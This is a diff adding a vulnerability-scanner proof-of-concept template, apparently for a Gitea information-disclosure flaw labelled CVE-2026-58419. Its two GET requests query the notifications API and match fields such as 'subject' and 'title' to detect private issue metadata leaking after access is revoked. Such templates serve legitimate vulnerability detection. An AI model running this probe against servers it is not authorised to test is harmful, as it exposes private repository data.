@@ -1,0 +1,57 @@
+[info]
+author = "AVE"
+description = "检测 Gitea 通知 API 在用户访问权限被撤销后是否仍泄露私有 Issue/PR 元数据。通过向 /api/v1/notifications 和 /api/v1/notifications/threads/{id} 发送请求，检查响应中 subject 字段是否包含私有仓库的 Issue 标题、状态、链接等敏感信息。"
+id = "POC-AVE-2026-0657"
+name = "CVE-2026-58419 PoC"
+severity = "high"
+tags = [
+    "cve-2026-58419",
+    "gitea",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-58419",
+    "GHSA-44qc-pgvp-wx7v",
+    "AVE-2026-0657",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/notifications"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "subject",
+    "title",
+    "html_url",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/notifications/threads/1"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "subject",
+    "title",
+    "state",
+]
